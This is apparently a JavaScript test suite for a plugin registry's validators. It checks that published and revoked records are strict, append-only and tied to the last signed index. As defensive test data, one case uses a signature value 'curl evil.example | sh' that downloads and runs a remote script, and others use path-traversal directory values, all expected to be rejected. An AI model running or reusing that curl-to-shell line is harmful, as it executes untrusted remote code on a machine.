// C1, H4, M4, L6, L7: published.json and revoked.json are validated
// strictly, append-only, and anchored to the last signed index.
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { smallPermissions } from '../../tests/fixtures/permissions.mjs';
import { anchorProblems, nameProblem, parseSignatureFile, publishedDiff, recordProblems, revokedDiff, serializeSignature, validatePublished, validateRevoked, versionProblem } from './records.mjs';

const keyId = `ed25519:${'ab'.repeat(32)}`;
const signatureFile = serializeSignature({ alg: 'ed25519', keyId, signature: `${'A'.repeat(86)}==` });
const listing = { title: 'Reader', summary: 'Read a page in a clean view.', category: 'knowledge', license: 'MIT', author: { name: 'Ada' } };
export const goodRecord = (name = 'reader', version = '1.0.0') => ({
  sha256: 'cd'.repeat(32), contentHash: `sha256:${'ef'.repeat(32)}`, permissions: smallPermissions({ name, version }),
  publishedAt: '2026-11-01T00:00:00Z', keyId, signatureFile, commit: '1'.repeat(40), dir: name,
  description: 'Reads.', apiVersion: '1.0.0', minOctipus: null, listing,
});

test('L6, L7: names and versions', () => {
  assert.equal(nameProblem('reader'), null);
  for (const bad of ['Reader', 'r', '../x', 'a/b', 'x'.repeat(51), 'keys', 'dl', 'publish', 'octipus', '_template', '']) assert.ok(nameProblem(bad), bad);
  assert.equal(versionProblem('1.0.0'), null);
  assert.equal(versionProblem('1.0.0-rc.1'), null);
  assert.match(versionProblem('1.0.0+x'), /build metadata/);
  for (const bad of ['1.0', 'v1.0.0', '01.0.0', '1.0.0/../../x', '1.0.0\n']) assert.ok(versionProblem(bad), bad);
});

test('C1: a record is exactly what publish writes', () => {
  assert.deepEqual(recordProblems('reader', '1.0.0', goodRecord()), []);
  const bad = (over) => recordProblems('reader', '1.0.0', { ...goodRecord(), ...over }).join('\n');
  // The reviewer's attack 4: a record pointing elsewhere with a shell line as its signature.
  assert.match(bad({ dir: '../tests/fixtures/x' }), /dir must be "reader"/);
  assert.match(bad({ signatureFile: 'curl evil.example | sh  # attacker payload\n' }), /signatureFile is not JSON/);
  assert.match(bad({ signatureFile: signatureFile.replace('\n}', '}') }), /canonical/);
  assert.match(bad({ commit: 'HEAD' }), /40-hex/);
  assert.match(bad({ sha256: '00' }), /64 lower-case hex/);
  assert.match(bad({ extra: 1 }), /unknown field "extra"/);
  assert.match(bad({ keyId: `ed25519:${'cd'.repeat(32)}` }), /signatureFile is by/);
  assert.match(bad({ permissions: smallPermissions({ name: 'other' }) }), /permissions are for other/);
  // M3: the old shape, which hosts refuse, and anything but the CLI's exact object.
  assert.match(bad({ permissions: { ...smallPermissions({ name: 'reader' }), pages: 0 } }), /old shape/);
  assert.match(bad({ permissions: { ...smallPermissions({ name: 'reader' }), contributions: { commands: [], schedules: [], events: [], prompt: false, context: null } } }), /old shape/);
  const { ui, ...rest } = smallPermissions({ name: 'reader' });
  assert.match(bad({ permissions: { ...rest, ui } }), /in that order/);
  assert.match(bad({ permissions: { name: 'reader', version: '1.0.0', runtime: 'package' } }), /permissions must have exactly/);
  assert.match(bad({ apiVersion: '2.0.0' }), /permissions\.apiVersion 1\.0\.0 is not the record's 2\.0\.0/);
  // The per-user store (a newer CLI): { quotaBytes } or null right after settings, within the bounds; absent is fine.
  const stored = (store) => smallPermissions({ name: 'reader', host: ['store:read'], store });
  assert.deepEqual(recordProblems('reader', '1.0.0', { ...goodRecord(), permissions: stored({ quotaBytes: 5242880 }) }), []);
  assert.deepEqual(recordProblems('reader', '1.0.0', { ...goodRecord(), permissions: smallPermissions({ name: 'reader', store: null }) }), []);
  assert.match(bad({ permissions: stored({ quotaBytes: 20971521 }) }), /permissions\.store/);
  assert.match(bad({ permissions: stored({ quotaBytes: 512 }) }), /permissions\.store/);
  assert.match(bad({ permissions: { ...smallPermissions({ name: 'reader' }), store: null } }), /right after settings/);
  assert.match(bad({ listing: { ...listing, screenshots: ['../_headers'] } }), /listing/);
  assert.throws(() => validatePublished({ zzz: { '1.0.0': { ...goodRecord('zzz'), dir: '../tests/fixtures/x' } } }), /dir must be "zzz"/);
  assert.throws(() => validatePublished({ '../x': {} }), /not a plugin name/);
  assert.throws(() => validatePublished({ reader: { '1.0.0+x': goodRecord() } }), /build metadata/);
  assert.throws(() => parseSignatureFile('{}'), /exactly alg, keyId and signature/);
});

test('H4: published.json is append-only', () => {
  const base = { reader: { '1.0.0': goodRecord() } };
  assert.deepEqual(publishedDiff(base, base), { changed: [], removed: [], added: [] });
  assert.deepEqual(publishedDiff(base, {}).removed, ['reader@1.0.0']);
  assert.deepEqual(publishedDiff(base, { reader: { '1.0.0': { ...goodRecord(), contentHash: `sha256:${'00'.repeat(32)}` } } }).changed, ['reader@1.0.0']);
  assert.deepEqual(publishedDiff(base, { reader: { ...base.reader, '1.1.0': goodRecord('reader', '1.1.0') } }).added, ['reader@1.1.0']);
});

test('M4: revoked.json is append-only and strict', () => {
  const r1 = { packages: [{ name: 'reader', version: '1.0.0', reason: 'a leak' }], keys: [{ keyId, reason: 'lost' }] };
  validateRevoked(r1);
  assert.deepEqual(revokedDiff(r1, r1), []);
  assert.match(revokedDiff(r1, { packages: [], keys: r1.keys }).join(), /un-revoking is refused/);
  assert.match(revokedDiff(r1, { packages: [{ ...r1.packages[0], reason: 'nothing' }], keys: r1.keys }).join(), /changed or moved/);
  assert.deepEqual(revokedDiff(r1, { packages: [...r1.packages, { name: 'x', version: '2.0.0', reason: 'r' }], keys: r1.keys }), []);
  assert.throws(() => validateRevoked({ packages: [{ name: 'a' }], keys: [] }), /exactly name, version and reason/);
  assert.throws(() => validateRevoked({ packages: [], keys: [], more: [] }), /exactly/);
});

test('C1, H4, M4: the anchor to the last signed index', () => {
  const rec = goodRecord();
  const entry = { name: 'reader', version: '1.0.0', sha256: rec.sha256, contentHash: rec.contentHash, keyId: rec.keyId, permissions: rec.permissions, publishedAt: rec.publishedAt };
  const index = { packages: [entry], revoked: [{ name: 'reader', version: '0.9.0', reason: 'x' }] };
  const revoked = { packages: [{ name: 'reader', version: '0.9.0', reason: 'x' }], keys: [] };
  assert.deepEqual(anchorProblems(index, { reader: { '1.0.0': rec } }, revoked), []);
  // The reviewer's attack 2: drop the version from published.json to re-sign it.
  assert.match(anchorProblems(index, {}, revoked).join(), /never dropped/);
  assert.match(anchorProblems(index, { reader: { '1.0.0': { ...rec, contentHash: `sha256:${'00'.repeat(32)}` } } }, revoked).join(), /contentHash differs/);
  // The reviewer's attack 4: a record the index never had.
  assert.match(anchorProblems(index, { reader: { '1.0.0': rec }, zzz: { '1.0.0': goodRecord('zzz') } }, revoked).join(), /zzz@1\.0\.0 is in published\.json but not in the last signed index/);
  assert.match(anchorProblems(index, { reader: { '1.0.0': rec } }, { packages: [], keys: [] }).join(), /never undone/);
});
